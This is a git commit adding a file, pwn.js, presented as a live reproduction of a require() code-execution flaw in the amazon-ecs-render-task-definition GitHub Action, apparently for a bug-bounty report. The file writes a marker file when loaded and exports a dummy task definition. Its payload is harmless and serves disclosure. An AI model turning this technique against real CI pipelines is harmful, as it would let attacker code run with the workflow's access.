78c666aae1fc1a2a96a130a23ec366ffc8e8ae03
Bobbeh Rhino <bobbeh@rhino.Rhino>
2026-08-20 13:16:42 -0400

    h1-3927165: live repro of require() RCE in amazon-ecs-render-task-definition@v1

---
+++ pwn.js
@@ -0,0 +1,6 @@
+const fs = require('fs');
+fs.writeFileSync('RCE_PROOF', 'executed-via-require-' + Date.now());
+module.exports = {
+  family: 'sample',
+  containerDefinitions: [{ name: 'web', image: 'old:1', essential: true }]
+};
